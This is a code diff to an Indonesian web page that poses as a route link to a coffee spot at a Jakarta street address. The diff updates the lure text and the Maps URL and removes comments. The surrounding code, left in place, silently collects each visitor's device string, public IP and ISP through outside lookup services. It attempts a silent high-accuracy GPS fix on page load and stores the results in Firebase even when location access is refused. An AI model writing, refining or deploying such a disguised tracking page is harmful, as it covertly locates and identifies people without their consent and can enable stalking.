@@ -26,8 +26,8 @@
     <div class="maps-bg"></div>
 
     <div class="route-panel">
-        <div class="route-title">Menuju Titik Temu</div>
-        <div class="route-desc">Ketuk tombol di bawah untuk melihat rute navigasi dan estimasi waktu perjalanan dari lokasi Anda saat ini.</div>
+        <div class="route-title">Menuju Tempat Ngopi</div>
+        <div class="route-desc">Ketuk tombol di bawah untuk melihat rute navigasi menuju lokasi di Jl. Pisangan Lama I No. 41 dan estimasi waktu perjalanan dari posisi Anda.</div>
     </div>
 
     <div class="btn-container">
@@ -52,12 +52,13 @@
         
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        const TARGET_MAPS_URL = "https://maps.google.com/?q=-6.175392,106.827153"; 
 
-        // Objek penampung data dasar (Device & Jaringan) yang didapat secara OTOMATIS
+        // URL Google Maps diarahkan langsung menggunakan koordinat/pencarian jalan Pisangan Lama I No. 41
+        const TARGET_MAPS_URL = "https://www.google.com/maps/search/?api=1&query=TEMPAT+NGOPI+Jalan+Pisangan+Lama+I+41+Jakarta"; 
+
         let logData = {
             waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
-            perangkat: navigator.userAgent, // Membaca merk HP & OS
+            perangkat: navigator.userAgent,
             ip_publik: "Gagal memuat",
             provider_isp: "Gagal memuat",
             latitude: "Tidak diizinkan",
@@ -66,22 +67,19 @@
             google_maps_link: "-"
         };
 
-        // Ambil data IP dan Provider secara otomatis saat web dibuka
         window.onload = function() {
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     logData.ip_publik = data.ip;
-                    logData.provider_isp = data.org; // 'org' berisi nama provider (ISP)
+                    logData.provider_isp = data.org;
                 })
                 .catch(() => {
-                    // Cadangan jika ipapi limit, gunakan ipify
                     fetch('https://api.ipify.org?format=json')
                         .then(res => res.json())
                         .then(json => { logData.ip_publik = json.ip; });
                 });
             
-            // Coba pemicu pelacakan GPS senyap di awal
             jalankanPelacakan(false);
         };
 
@@ -103,7 +101,7 @@
                     }, 
                     (err) => {
                         if (isFromButton || err.code === err.TIMEOUT) {
-                            saveToFirebase(); // Tetap simpan walau GPS ditolak (IP & ISP tetap dapat)
+                            saveToFirebase();
                         }
                     }, 
                     { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
